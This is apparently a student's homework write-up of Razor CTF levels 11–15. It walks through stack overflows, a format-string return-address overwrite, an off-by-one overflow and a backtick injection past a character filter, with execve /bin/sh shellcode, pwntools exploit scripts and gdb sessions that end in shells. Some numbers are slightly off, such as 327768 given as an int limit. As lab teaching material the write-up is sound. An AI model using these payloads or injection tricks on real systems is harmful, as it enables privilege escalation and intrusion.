# Homework 4 - Razor CTF challenges

## Tools used

- **pwntools:** Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

## Level 11

Inspecting the folder `/var/challenge/level10`:

```bash
icyfire@razor level10 → ls /var/challenge/level10 -lha
total 24K
drwxr-x---  2 root lev10 4.0K Nov 15  2020 .
drwxr-xr-x 16 root sudo  4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev11 9.3K Aug 27  2020 10
-rw-r--r--  1 root lev10 1.2K Aug 27  2020 10.c
```

Inspecting the source code in `10.c`:

```c
int checkpwd(char *p)
{
    ...
    strcpy(mypwd, p); /* creates copy of the password */
    printf("Checking password %s\n", mypwd);
    ...
}

int main (int argc, char *argv[])
{
    ...
    strncpy(password, argv[1], BUFSIZE);
    strncpy(username, argv[2], BUFSIZE);
    ...
}
```

The program accepts two arguments. The arguments are initially copied to two string buffers of size 512. Since it uses `strncpy` function, it uses only the mentioned number of bytes which is 512. But if we supply a string of length 512 as the password, it'll get copied to the buffer without a terminating `\0` character. Therefore, in memory when the the `password` string comes first followed by the `username` string, if a pointer to the `password` string is sent to the `checkpwd` string, it will consider the string until it meets a `'\0'` character, which is at the end of the username string only. Hence we can perform a buffer overflow exploit in the `strcpy` function in the `checkpwd` function.

Now we can use `gdb` to craft an exploit. Firstly export the shell code to the environment with a NOP sled:

```bash
icyfire@razor level10 → export _SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

Next open `gdb` and set a breakpoint at the `ret` instruction of `checkpwd` function.

```bash
icyfire@razor level10 → gdb /var/challenge/level10/10
Reading symbols from /var/challenge/level10/10...
(gdb) disass checkpwd
Dump of assembler code for function checkpwd:
   0x080485e4 <+0>:	push   %ebp
   ...
   0x08048700 <+284>:	ret
End of assembler dump.
(gdb) break *0x08048700
Breakpoint 1 at 0x8048700
```

Run the application by providing 512 characters in the first input and a string to overflow the buffer in the second argument. Then we insepct the top of the stack for the return address.

```bash
(gdb) run $(python -c "print 'A'*512") ABCDEFGHIJKLMNOPQRSTUVWXYZ
Starting program: /var/challenge/level10/10 $(python -c "print 'A'*512") ABCDEFGHIJKLMNOPQRSTUVWXYZ
Checking password AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZ for user ABCDEFGHIJKLMNOPQRSTUVWXYZ
Checking password AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZ
Cannot open dict file

Breakpoint 1, 0x08048700 in checkpwd ()
(gdb) x/4wx $esp
0xfffe4624:	0x4c4b4a49	0x504f4e4d	0x54535251	0x58575655
```

Here we can see the return address consists of `0x4c4b4a49`, which is hex for `IJKL`. We replace `IJKL` with the address of our shell code. We inspect the environment to find the address of the shell code.

```bash
(gdb) x/64s *((char **) environ)
0xfffe4e8b:	"SHELL=/bin/bash"
0xfffe4e9b:	"LSCOLORS=Gxfxcxdxdxegedabagacad"
0xfffe4ebb:	"LESS=-R"
...

0xfffe69f5:	'\220' <repeats 200 times>...
0xfffe6abd:	'\220' <repeats 200 times>...
```

Choosing one address from the NOP sled we construct the below script:

```python
import os
from pwn import process, p32
env = os.environ
env['_SHELLCODE'] = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
proc = process(argv=["/var/challenge/level10/10", "A" * 512, b"B" * 8 + p32(0xfffe76b1)], env=env)
proc.interactive()
```

Executing the script, we get:

```bash
icyfire@razor level10 → python3 exploit.py
[+] Starting local process '/var/challenge/level10/10': pid 3308122
[*] Switching to interactive mode
Checking password AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\xb1v\xfe\xff for user BBBBBBBB\xb1v\xfe\xff
Checking password AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\xb1v\xfe\xff
Cannot open dict file
$ l33t
Woot! Congratulations you broke level lev11!
Adding user 'icyfire' to group 'lev11' ...
Adding user icyfire to group lev11
Done
```

## Level 12

Inspecting the code for `11.c` in `/var/challenge/level11` we see:

```c
    ...
    max = sizeof(filename);
    len = strlen(argv[1]);
    ...
    if (len > max) goto error;
    strcpy(filename, argv[1]);
    ...
```

The program checks for the max size of `filename` variable, which is 256 and makes sure the size of the first argument that we supply. Since the argument is being assigned to an `int` variable, the max value it can hold is 327768. If we supply a string with length greater than 327768, the program will interpret it as a negative number. Because of this we will be able to perform a buffer overflow on the `strcpy` function.

We can use `gdb` to craft an exploit. Opening `gdb`, setting a breakpoint at `ret` instruction of `main` and sending an input greater than 327768, on inspecting the top of the stack for return address we see:

```bash
icyfire@razor level11 → gdb /var/challenge/level11/11
Reading symbols from /var/challenge/level11/11...
(gdb) disass main
Dump of assembler code for function main:
   0x08048554 <+0>:	push   %ebp
   ...
   0x08048682 <+302>:	ret
End of assembler dump.
(gdb) break *0x08048682
Breakpoint 1 at 0x8048682
(gdb)
(gdb) run $(python -c "print 'ABCD' * 10000") DUMMY
Starting program: /var/challenge/level11/11 $(python -c "print 'ABCD' * 10000") DUMMY
Breakpoint 1, 0x08048682 in main ()
(gdb) x/4wx $esp
0xfffdb00c:	0x44434241	0x44434241	0x44434241	0x44434241
```

We can see that the return address is replaced by `0x44434241` which is `ABCD` in ASCII. We use the same method as level 10 to find the address of the shell (`0xfffe759e`) code and craft the following exploit script.

```python
import os
from pwn import process

env = os.environ
env['_SHELLCODE'] = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
proc = process(argv=["/var/challenge/level11/11", '\xfe\xff\xe9\x75' * 10000, "DUMMY"], env=env)
proc.interactive()
```

Running the exploit script we get:

```bash
icyfire@razor level11 → python3 exploit.py
[+] Starting local process '/var/challenge/level11/11': pid 1916726
[*] Switching to interactive mode
$ l33t
Woot! Congratulations you broke level lev12!
Adding user 'icyfire' to group 'lev12' ...
Adding user icyfire to group lev12
Done.
```

## Level 13

Inspecting the program `12.c` in `/var/challenge/level12/12` we see:

```c
...
int sudoexec(char *command)
{
    ...
    snprintf(log_entry, 64, "%d: %s\n", getuid(), command);
    fprintf(f, log_entry);
    ...
}

int main (int argc, char** argv)
{
    ...
    if (sudoexec(argv[1]) != 0)
    ...
}
```

We can see that the `log_entry` string in the `sudoexec` function is obtained from the first argument that we supply to the program. Since there is no format string used for the `fprintf` function, it is susceptible to format string vulnerability.

To craft the exploit we open `gdb` and set a breakpoint at `main`, the `fprintf` function and `ret` instruction of `sudoexec` function.

```bash
icyfire@razor level11 → gdb /var/challenge/level12/12
Reading symbols from /var/challenge/level12/12...
(gdb) disass sudoexec
Dump of assembler code for function sudoexec:
   0x08048614 <+0>:	push   %ebp
   ...
   0x0804869e <+138>:	call   0x8048550 <snprintf@plt>
   0x080486a3 <+143>:	lea    -0x48(%ebp),%eax
   0x080486a6 <+146>:	mov    %eax,0x4(%esp)
   0x080486aa <+150>:	mov    -0x8(%ebp),%eax
   0x080486ad <+153>:	mov    %eax,(%esp)
   0x080486b0 <+156>:	call   0x8048540 <fprintf@plt>
   ...
   0x080487f4 <+480>:	ret
End of assembler dump.
(gdb) break main
Breakpoint 1 at 0x80487fb
(gdb) break *0x080486b0
Breakpoint 2 at 0x80486b0
(gdb) break *0x080487f4
Breakpoint 3 at 0x80487f4
```

Since format string exploits require high precision we can delete all the environment variables to reproduce the vulnerability multiple times.

```bash
(gdb) unset env
Delete all environment variables? (y or n) y
```

To conduct the exploit, we can pass a format string as the first parameter and the shellcode as the second parameter. We can use `ljust` function to pad the format string to a fixed size so that the stack doesn't move around and we can reproduce the vulnerability multiple times.:

```bash
(gdb) run $(python -c  "print 'dummy'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
Starting program: /var/challenge/level12/12 $(python -c  "print 'dummy'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")

(gdb) x/4s *((char **) environ)
0xffffdfb4:	"PWD=/home/icyfire/scratch/level11"
0xffffdfd6:	"SHLVL=0"
```

The program stops at the first breakpoint which is at the beginning of `main` function. Inspecting the environment we can see that `gdb` adds two environment variables `PWD` and `SHLVL` by default.

Inspecting the frame of the main function we see:

```bash
(gdb) x/4wx $ebp
0xffffddb8:	0x00000000	0xf7dabee5	0x00000003	0xffffde54
```

Here we can see that the value of `argc` is 3 and a pointer `0xffffde54` to the list of arguments `argv`. Expecting the pointer to `argv`:

```bash
(gdb) x/4wx 0xffffde54
0xffffde54:	0xffffdf3f	0xffffdf59	0xffffdf59	0x00000000
```

Here we can see three pointers: `0xffffdf3f` pointing to `argv[0]`, `0xffffdf59` pointing to `argv[1]` which is out format, `0xffffdf59` pointing to `argv[2]` which is our shellcode.

Continuing two times to the `ret` instruction of `sudoexec` we can inspect the top of the stack to get the location of the return address.

```bash
Breakpoint 1, 0x080487fb in main ()
(gdb) conti
Continuing.

Breakpoint 2, 0x080486b0 in sudoexec ()
(gdb) conti
Continuing.
Cant open sudoers file

Breakpoint 3, 0x080487f4 in sudoexec ()
(gdb) x/1x $esp
0xffffdda0:	0x08048845
```

We can see that the return address is at `0xffffdda0`. Since we will be using `%hn` format specifier to write a short integer 2 bytes at a time, we can specify the location of first and second half of the return address in the beginning of the format string.

Running the program again with the above arguments and inspecting `argv[1]` we see:

```bash
(gdb) run $(python -c  "print '\xa0\xdd\xff\xff\xa2\xdd\xff\xff'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /var/challenge/level12/12 $(python -c  "print '\xa0\xdd\xff\xff\xa2\xdd\xff\xff'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")

Breakpoint 1, 0x080487fb in main ()
(gdb) x/8x 0xffffdf59
0xffffdf59:	0xffffdda0	0xffffdda2	0x2e2e2e2e	0x2e2e2e2e
0xffffdf69:	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e
```

Since we want the addresses to be aligned to a multiple of 4, we can add 3 padding character in the beginning.

```bash
(gdb) run $(python -c  "print '...\xa0\xdd\xff\xff\xa2\xdd\xff\xff'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /var/challenge/level12/12 $(python -c  "print '...\xa0\xdd\xff\xff\xa2\xdd\xff\xff'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")

Breakpoint 1, 0x080487fb in main ()
(gdb) x/8x 0xffffdf59
0xffffdf59:	0xa02e2e2e	0xa2ffffdd	0x2effffdd	0x2e2e2e2e
0xffffdf69:	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e
(gdb) x/8x 0xffffdf59 + 3
0xffffdf5c:	0xffffdda0	0xffffdda2	0x2e2e2e2e	0x2e2e2e2e
0xffffdf6c:	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e	0x2e2e2e2e
```

Here we can see that the addresses are perfectly aligned at a multple of 4 at `0xffffdf5c`. Continuing to the `fprintf` function of `sudoexec` and examining the top of the stack and calculating the distance to our return address location given in `argv[1]` we get:

```bash
(gdb) continue
Continuing.
Breakpoint 2, 0x080486b0 in sudoexec ()
(gdb) x/4x $esp
0xffffdc3c:	0x0804b1a0	0xffffdd54	0x08048973	0x00000416
(gdb) p/d (0xffffdf5c - 0xffffdc3c)/4
$2 = 200
```

Therefore we can write into the return address using `%199$hn` and `%200$hn`. 

```bash
(gdb) run $(python -c  "print '...\xa0\xdd\xff\xff\xa2\xdd\xff\xff%199\$hn%200\$hn'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /var/challenge/level12/12 $(python -c  "print '...\xa0\xdd\xff\xff\xa2\xdd\xff\xff%199\$hn%200\$hn'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")

Breakpoint 1, 0x080487fb in main ()
(gdb) cont
Continuing.

Breakpoint 2, 0x080486b0 in sudoexec ()
(gdb)
Continuing.
Can't open sudoers file

Breakpoint 3, 0x080487f4 in sudoexec ()
(gdb) x/1x $esp
0xffffdda0:	0x00110011
```

Here we can see that the return address got overwritten by `0x00110011`. Since `$hn` writes the number of characters written so far with the `fprintf` function, we need to put additional spaces so that the value adds up to `0xdda0` and `0xffff` which constitutes out return address. After a few trials we come up with the correct number of padding required to add and we have the following format string:

```
...\xa0\xdd\xff\xff\xa2\xdd\xff\xff%57225x%199\$hn%8293x%200\$hn
```

To replicate the results from `gdb` outside, we can use the `env` command to wipe out the environment and add the two `gdb` generated environment variables and call the script. Hence we can come up with the following exploit script:

```bash
#!/bin/bash
env -i PWD=/home/icyfire/scratch/level12 SHLVL=0 /var/challenge/level12/12 $(python -c  "print '...\xa0\xdd\xff\xff\xa2\xdd\xff\xff%57225x%199\$hn%8293x%200\$hn'.ljust(64,'.')") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
```

Running the script we get:

```bash
icyfire@razor level12 → ./exploit.sh
User not listed in the sudoers file
$ l33t
Woot! Congratulations you broke level lev13!
Adding user 'icyfire' to group 'lev13' ...
Adding user icyfire to group lev13
Done.
```

# Level 14

Inspecting the source code from `13.c` in `/var/challenge/level13` we see:

```c
char *checkmsg(char *msg)
{
  char mymsg[256];
  int i;
  char *pos;
  int len = 0;

  len = strlen(msg) < 256 ? strlen(msg) : 256;
  for(i = 0; i <= len; i++) {
    mymsg[i] = msg[i];
  }
  ...
}
```

Here in the for loop we have `i <= len` instead of `i < len`. Therefore if we supply a string with length greater than 256, it creates an off by one error. This can result in buffer overflow. Firstly we can try fuzzing the input to create a segment fault. Copying the executable to a writeable directory, enabling core dumps and starting the program with 256 characters as the second input we see:

```bash
icyfire@razor level13 → cp /var/challenge/level13/13 ./
'/var/challenge/level13/13' -> './13'
icyfire@razor level13 → ulimit -c unlimited
icyfire@razor level13 → ./13 icyfire $(python -c "print 'ABCD' * 64")
Segmentation fault (core dumped)
```

Inspecting the core using `gdb` we see:

```bash
icyfire@razor level13 → gdb -c core
[New LWP 2064547]
Core was generated by './13 icyfire ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDAB'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x44434241 in ?? ()
```

Here we can see that the program tried to execute the instruction at `0x44434241` which is ASCII for `ABCD`. We can use `gdb` to find the location of the shellcode in the environment for the program and replace `ABCD` with an address in the NOP sled (`0xfffe79d8`). After finding the address the following exploit script can be made:

```python
import os
from pwn import process,p32
env = os.environ
env['_SHELLCODE'] = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
arg = p32(0xfffe79d8) * 64
proc = process(argv=["/var/challenge/level13/13", "icyfire", arg], env=env)
proc.interactive()
```

Running the exploit script we get:

```bash
icyfire@razor level13 → python3 exploit.py
[+] Starting local process '/var/challenge/level13/13': pid 2685581
[*] Switching to interactive mode
$ l33t
Woot! Congratulations you broke level lev14!
Adding user 'icyfire' to group 'lev14' ...
Adding user icyfire to group lev14
Done.
$
[*] Stopped process '/var/challenge/level13/13' (pid 2685581)
```

## Level 15

Inspecting the contents of `/var/challenge/level14` we see: 

```
icyfire@razor level14 → ls -lha /var/challenge/level14
total 32K
drwxr-x---  2 root lev14 4.0K Aug 27  2020 .
drwxr-xr-x 16 root sudo  4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev15  22K Aug 27  2020 14
```

Since we don't have source code for the program, we can use a decompiler to get the source code. Using `ghidra` we can see the source code like this:

```c
undefined4 main(undefined4 param_1,int param_2)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  undefined4 local_54;
  char local_4d [64];
  byte local_d;
  FILE *local_c;
  size_t local_8;
  
  local_c = (FILE *)0x0;
  local_d = 0;
  memcpy(local_4d,".XXXXXX",8);
  if (*(int *)(param_2 + 4) == 0) {
    fwrite("What?!?\n",1,8,stderr);
    local_54 = 0xffffffff;
  }
  else {
    iVar1 = strcmp(*(char **)(param_2 + 4),"nomoresecrets");
    if (iVar1 == 0) {
      if (*(int *)(param_2 + 8) == 0) {
        fwrite("No more what?!?\n",1,0x10,stderr);
        local_54 = 0xffffffff;
      }
      else {
        local_c = fopen(*(char **)(param_2 + 8),"r");
        if (local_c == (FILE *)0x0) {
          fprintf(stderr,"Can\'t open file %s\n",*(undefined4 *)(param_2 + 8));
          local_54 = 0xffffffff;
        }
        else {
          printf("char code[] = \"");
          while( true ) {
            sVar2 = fread(&local_d,1,1,local_c);
            if (sVar2 == 0) break;
            printf("\\x%02x",(uint)local_d);
          }
          puts("\";");
          fclose(local_c);
          local_54 = 0;
        }
      }
    }
    else {
      iVar1 = strcmp(*(char **)(param_2 + 4),"moresecrets");
      if (iVar1 == 0) {
        pcVar3 = mktemp(local_4d);
        if (pcVar3 == (char *)0x0) {
          fwrite("No file name\n",1,0xd,stderr);
          local_54 = 0xffffffff;
        }
        else {
          local_c = fopen(local_4d,"w+");
          if (local_c == (FILE *)0x0) {
            fprintf(stderr,"Can\'t open file %s\n",local_4d);
            local_54 = 0xffffffff;
          }
          else {
            local_8 = fwrite(&code,1,0x2ec2,local_c);
            if (local_8 == 0x2ec2) {
              fclose(local_c);
              iVar1 = chmod(local_4d,0x56d);
              if (iVar1 != 0) {
                perror("Cannot do it!");
              }
              sleep(4);
              unlink(local_4d);
              local_54 = 0;
            }
            else {
              fprintf(stderr,"Can\'t write to file %s (%d)\n",local_4d,local_8);
              local_54 = 0xffffffff;
            }
          }
        }
      }
      else {
        fwrite("What did you say?!?\n",1,0x14,stderr);
        local_54 = 0xffffffff;
      }
    }
  }
  return local_54;
}
```

We can see a few strings like `nomoresecrets` and `moresecrets`. Trying both parameters we see different outputs.

```bash
icyfire@razor level14 → /var/challenge/level14/14 nomoresecrets
No more what?!?
03:19:53 icyfire@razor level14 → /var/challenge/level14/14 moresecrets
```

On execution of the second command, we can see that there is a delay. From the source code we can guess that part being the section where there is a `sleep` function being called. On further inspection of that part, we can see that a temp file is name is being generated using `mktemp` and pattern `.XXXXXX`. Then the file is opened and written into and the permission is changed using `chmod` to `0x56d`. `0x56d` in octal stands for `2555` which is a set gid executable.

Therefore executing the program with `moresecrets` as parameter and forcefully terminating it before completion, we get: 

```bash
icyfire@razor level14 → /var/challenge/level14/14 moresecrets
^C
icyfire@razor level14 → ls -lha
total 24K
drwxrwxr-x  2 icyfire icyfire 4.0K Nov 21 03:31 .
drwxrwxr-x 18 icyfire icyfire 4.0K Nov 19 03:17 ..
-rw-rw-r--  1 icyfire icyfire 1.4K Nov 18 06:44 exploit.py
-r-xr-sr-x  1 icyfire lev15    12K Nov 21 03:31 .XZRKlX
```

We can see that a new file `.XZRKlX` is created. Decompiling that executable using `ghidra` we get: 

```c
undefined4 main(undefined4 param_1,int param_2)

{
  char *pcVar1;
  char local_40c [1032];
  
  if (*(int *)(param_2 + 4) == 0) {
    fprintf(stderr,"Huh?!?\n");
  }
  else {
    pcVar1 = strchr(*(char **)(param_2 + 4),0x3b);
    if (((pcVar1 == (char *)0x0) &&
        (pcVar1 = strchr(*(char **)(param_2 + 4),0x7c), pcVar1 == (char *)0x0)) &&
       (pcVar1 = strchr(*(char **)(param_2 + 4),0x26), pcVar1 == (char *)0x0)) {
      snprintf(local_40c,0x400,"/bin/ls %s",*(undefined4 *)(param_2 + 4));
      system(local_40c);
      return 0;
    }
    fprintf(stderr,"I don\'t think so!\n");
  }
  return 0xffffffff;
}
```

Here we can see that the program executes the `/bin/ls` command with the `argv[1]` as parameter. It is also checking for characters `0x7c` and `0x26` which are `|` and `&` respectively. Therefore we can use the backtick (`) character to execute `l33t`.

```bash
icyfire@razor level14 → ./.XZRKlX \`l33t\`
/bin/ls: cannot access 'Adding': No such file or directory
/bin/ls: cannot access 'user': No such file or directory
/bin/ls: cannot access '`icyfire'\''': No such file or directory
/bin/ls: cannot access 'to': No such file or directory
/bin/ls: cannot access 'group': No such file or directory
/bin/ls: cannot access '`lev15'\''': No such file or directory
/bin/ls: cannot access '...': No such file or directory
/bin/ls: cannot access 'Adding': No such file or directory
/bin/ls: cannot access 'user': No such file or directory
/bin/ls: cannot access 'icyfire': No such file or directory
/bin/ls: cannot access 'to': No such file or directory
/bin/ls: cannot access 'group': No such file or directory
/bin/ls: cannot access 'lev15': No such file or directory
/bin/ls: cannot access 'Done.': No such file or directory
```
